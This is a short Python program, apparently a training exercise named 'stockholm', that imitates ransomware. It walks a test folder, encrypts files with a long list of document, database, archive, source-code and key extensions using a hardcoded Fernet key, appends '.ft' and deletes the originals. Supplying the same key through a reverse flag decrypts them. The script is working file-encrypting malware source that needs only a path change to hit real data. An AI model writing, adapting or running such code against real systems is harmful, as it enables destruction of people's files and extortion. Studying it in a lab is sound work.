import os
import argparse
from cryptography.fernet import Fernet

# Define los argumentos del programa
parser = argparse.ArgumentParser(description='Programa stockholm')
parser.add_argument('-v', '--version', action='version', version='%(prog)s 1.0')
parser.add_argument('-r', '--reverse', metavar='clave', help='Revertir la infección')
parser.add_argument('-s', '--silent', action='store_true', help='No mostrar output')
args = parser.parse_args()

# Define los parámetros del cifrado
# key = b'super_secret_master_key_'
key = b'WOdOHQEC1AfXRCumasdD6uY8Y6eBVKSPMIOscJ9rs50='
cipher_suite = Fernet(key)

# Define la función para renombrar y cifrar los archivos
def infect_folder():
    # Define la carpeta a infectar
    folder_path = os.path.expanduser('/home/jcueto-r/prueba/')
    
    # Define las extensiones a infectar
    extensions = [".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".pst", ".ost", ".msg", ".eml", ".vsd", ".vsdx", ".txt", ".csv", ".rtf", ".123", ".wks", ".wk1", ".pdf", ".dwg", ".onetoc2", ".snt", ".jpeg", ".jpg", ".docb", ".docm", ".dot", ".dotm", ".dotx", ".xlsm", ".xlsb", ".xlw", ".xlt", ".xlm", ".xlc", ".xltx", ".xltm", ".pptm", ".pot", ".pps", ".ppsm", ".ppsx", ".ppam", ".potx", ".potm", ".edb", ".hwp", ".602", ".sxi", ".sti", ".sldx", ".sldm", ".sldm", ".vdi", ".vmdk", ".vmx", ".gpg", ".aes", ".ARC", ".PAQ", ".bz2", ".tbk", ".bak", ".tar", ".tgz", ".gz", ".7z", ".rar", ".zip", ".backup", ".iso", ".vcd", ".bmp", ".png", ".gif", ".raw", ".cgm", ".tif", ".tiff", ".nef", ".psd", ".ai", ".svg", ".djvu", ".m4u", ".m3u", ".mid", ".wma", ".flv", ".3g2", ".mkv", ".3gp", ".mp4", ".mov", ".avi", ".asf", ".mpeg", ".vob", ".mpg", ".wmv", ".fla", ".swf", ".wav", ".mp3", ".sh", ".class", ".jar", ".java", ".rb", ".asp", ".php", ".jsp", ".brd", ".sch", ".dch", ".dip", ".pl", ".vb", ".vbs", ".ps1", ".bat", ".cmd", ".js", ".asm", ".h", ".pas", ".cpp", ".c", ".cs", ".suo", ".sln", ".ldf", ".mdf", ".ibd", ".myi", ".myd", ".frm", ".odb", ".dbf", ".db", ".mdb", ".accdb", ".sql", ".sqlitedb", ".sqlite3", ".asc", ".lay6", ".lay", ".mml", ".sxm", ".otg", ".odg", ".uop", ".std", ".sxd", ".otp", ".odp", ".wb2", ".slk", ".dif", ".stc", ".sxc", ".ots", ".ods", ".3dm", ".max", ".3ds", ".uot", ".stw", ".sxw", ".ott", ".odt", ".pem", ".p12", ".csr", ".crt", ".key", ".pfx", ".der"]

    # Recorre los archivos de la carpeta y renombra/cifra los que corresponden
    try:    
        for filename in os.listdir(folder_path):
            extension = os.path.splitext(filename)[1]
            if extension in extensions:
                new_filename = filename + '.ft'
                if os.path.isfile(os.path.join(folder_path, new_filename)):
                    continue
                with open(os.path.join(folder_path, filename), 'rb') as file:
                    plaintext = file.read()
                ciphertext = cipher_suite.encrypt(plaintext)
                with open(os.path.join(folder_path, new_filename), 'wb') as file:
                    file.write(ciphertext)
                os.remove(os.path.join(folder_path, filename))
                if not args.silent:
                    print(f'{filename} cifrado como {new_filename}')
    except PermissionError:
        print(f"No tiene permisos en esta carpeta, no se puede modificar el archivo {filename}")

# Define la función para revertir la infección
def revert_infection():
    # Define la carpeta a desinfectar
    folder_path = os.path.expanduser('/home/jusalas-/prueba/')
    
    # Recorre los archivos de la carpeta y desencripta/renombra los que corresponden
    for filename in os.listdir(folder_path):
        extension = os.path.splitext(filename)[1]
        if extension == '.ft':
            new_filename = os.path.splitext(filename)[0]
            with open(os.path.join(folder_path, filename), 'rb') as file:
                ciphertext = file.read()
            plaintext = cipher_suite.decrypt(ciphertext)
            with open(os.path.join(folder_path, new_filename), 'wb') as file:
                file.write(plaintext)
            os.remove(os.path.join(folder_path, filename))
            if not args.silent:
                print(f'{filename} desencriptado como {new_filename}')

# Ejecuta el programa
if args.reverse == key.decode('utf-8'):
    revert_infection()
else:
    infect_folder()
